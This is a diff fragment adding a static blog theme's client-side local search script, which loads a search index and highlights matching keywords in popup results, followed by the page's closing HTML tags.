+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
